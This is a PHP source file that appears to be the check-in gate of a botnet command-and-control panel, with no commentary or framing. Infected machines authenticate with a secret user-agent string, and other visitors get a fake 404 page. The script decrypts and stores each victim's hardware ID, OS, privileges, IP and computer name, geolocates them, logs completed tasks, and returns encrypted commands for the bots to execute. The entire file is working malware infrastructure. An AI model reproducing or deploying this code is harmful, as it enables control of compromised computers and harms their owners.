<?php
include 'inc/config.php';
include 'inc/geo/geoip.inc';
$gi = geoip_open("inc/geo/GeoIP.dat", "");

$gate = $odb->query("SELECT gate_status FROM settings")->fetchColumn(0);
if ($gate != "1")
{
	die();
}

if (!isset($_POST['id']) || !isset($_POST['os']) || !isset($_POST['pv']) || !isset($_POST['ip']) || !isset($_POST['cn']) || !isset($_POST['bv']))
{
	include 'inc/404.php';
	die();
}
if ($_SERVER['HTTP_USER_AGENT'] != "E9BC3BD76216AFA560BFB5ACAF5731A3")
{
	include 'inc/404.php';
	die();
}

$ip = $_SERVER['REMOTE_ADDR'];
$country = geoip_country_id_by_addr($gi, $ip);

$hwid = decrypt($deckey, $_POST['id']);
$opsys = decrypt($deckey, $_POST['os']);
$privs = decrypt($deckey, $_POST['pv']);
$inpat = base64_encode(decrypt($deckey, $_POST['ip']));
$compn = base64_encode(decrypt($deckey, $_POST['cn']));
$botvr = decrypt($deckey, $_POST['bv']);
$lastr = base64_encode(decrypt($deckey, $_POST['lr']));
$opera = "0";
$taskd = "0";
$unins = "0";
if (isset($_POST['op']))
{
	$opera = decrypt($deckey, $_POST['op']);
}
if (isset($_POST['td']))
{
	$taskd = decrypt($deckey, $_POST['td']);
}
if (isset($_POST['uni']))
{
	$unins = decrypt($deckey, $_POST['uni']);
}

if (!ctype_alnum($hwid) || !ctype_alnum($privs) || !ctype_alnum($opera) || !ctype_alnum($taskd) || !ctype_alnum($unins) || !preg_match('/^[a-z0-9 .]+$/i', $botvr) || !preg_match('/^[a-z0-9 .]+$/i', $opsys))
{
	include 'inc/404.php';
	die();
}

$exs = $odb->prepare("SELECT COUNT(*) FROM bots WHERE bothwid = :h");
$exs->execute(array(":h" => $hwid));
if ($exs->fetchColumn(0) == "0")
{
	$i = $odb->prepare("INSERT INTO bots VALUES(NULL, :hw, :ip, :cn, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), :td, :os, :bv, :pv, :in, :cp, :lr, '1')");
	$i->execute(array(":hw" => $hwid, ":ip" => $ip, ":cn" => $country, ":td" => $taskd, ":os" => $opsys, ":bv" => $botvr, ":pv" => $privs, ":in" => $inpat, ":cp" => $compn, ":lr" => $lastr));
}else{
	$u = $odb->prepare("UPDATE bots SET lastresponse = UNIX_TIMESTAMP(), currenttask = :c WHERE bothwid = :h");
	$u->execute(array(":c" => $taskd, ":h" => $hwid));
}

if ($opera == "1")
{
	$in = $odb->prepare("INSERT INTO tasks_completed VALUES(NULL, :h, :i)");
	$in->execute(array(":h" => $hwid, ":i" => $taskd));
}
if ($unins == "1")
{
	$del = $odb->prepare("DELETE FROM bots WHERE bothwid = :h LIMIT 1");
	$del->execute(array(":h" => $hwid));
}

$cmds = $odb->query("SELECT * FROM tasks ORDER BY id");
while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
{
	if ($com['status'] == "1")
	{
		$executions = $odb->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
		if ($executions == $com['executions'])
		{
			continue;
		}else{
			$ae = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
			$ae->execute(array(":i" => $com['id'], ":h" => $hwid));
			if ($ae->fetchColumn(0) == 0)
			{
				echo encrypt($deckey, 'newtask:'.$com['id'].':'.base64_encode($com['task']).':'.base64_encode($com['params']));
				break;
			}
		}
	}
}
?>